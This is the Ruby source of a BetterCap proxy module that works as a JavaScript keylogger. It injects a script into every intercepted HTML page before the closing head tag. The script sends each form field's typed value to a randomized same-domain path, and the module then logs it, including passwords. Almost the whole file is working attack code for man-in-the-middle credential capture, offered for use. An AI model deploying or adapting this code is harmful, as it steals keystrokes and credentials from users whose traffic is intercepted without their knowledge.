=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

require 'uri'

class Keylogger < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'Keylogger',
    'Description' => 'Send keystrokes through randomized GET requests.',
    'Version'     => '1.0.0',
    'Author'      => "yungtravla (github)",
    'License'     => 'GPL3'
  )

  # We send the keystrokes to a random path on the same domain to bypass CORS restrictions.
  @@destination = ( ('a'..'z').to_a + ('0'..'9').to_a ).shuffle.join
  @@keylogger = <<EOF

    var ks = ''

    function sendKS(ks){
      var req = new XMLHttpRequest()
      req.open( 'GET', './#{@@destination}?' + ks )
      req.send()
    }

    document.addEventListener('keyup', function(e){
      if (e.target.value)
        sendKS(e.target.value)
        ks = e.target.value
    })

    window.onbeforeunload = function(){
      if (ks != '') sendKS(ks)
    }

EOF

  def initialize
    BetterCap::Logger.info "[#{'KEYLOGGER'.green}] " + "Injecting JS keylogger ..."
  end

  def on_request(request, response)
    # Receive keystroke
    @req = "#{request.base_url}#{request.path}"
    if @req.include?("/#{@@destination}?")
      uri = URI.parse("#{@req}")
      keystroke = URI.unescape( uri.query )
      BetterCap::Logger.raw "\e[1A[#{BetterCap::StreamLogger.addr2s(request.client)}] " + "KEYSTROKE".light_blue + " #{uri.scheme}://#{request.host} #{keystroke.yellow}\033[K"
      # "\e[1A[" overwrites previously printed line, "\033[K" removes remaining characters until end of new line
      # I probably should override a StreamLogger function to ignore keystroke packets, cause this ^ method only removes the previous line...
    end

    # Inject keylogger
    if response.content_type =~ /^text\/html.*/
      injection = "<script type='text/javascript'>#{@@keylogger}</script></head>"
      response.body.sub!( /<\/head>/i ) { injection }
    end
  end
end
